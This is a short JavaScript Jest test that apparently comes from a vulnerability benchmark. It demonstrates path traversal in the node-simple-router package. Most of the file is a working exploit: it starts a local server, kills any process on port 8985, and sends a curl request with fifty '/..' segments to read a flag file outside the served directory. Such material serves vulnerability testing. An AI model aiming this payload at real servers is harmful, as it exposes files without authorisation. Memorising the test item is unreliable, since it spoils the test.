const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in node-simple-router", (done) => {
  expect.assertions(1);
  const Router = require("node-simple-router");
  const http = require("http");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8985/tcp", () => {});
  } catch (e) {}
  let router = new Router({
    static_route: process.cwd(),
    cgi_dir: "cgi-bin",
    use_nsr_session: false,
    default_home: [],
  });
  const server = http.createServer(router);
  server.listen(8985);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8985${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
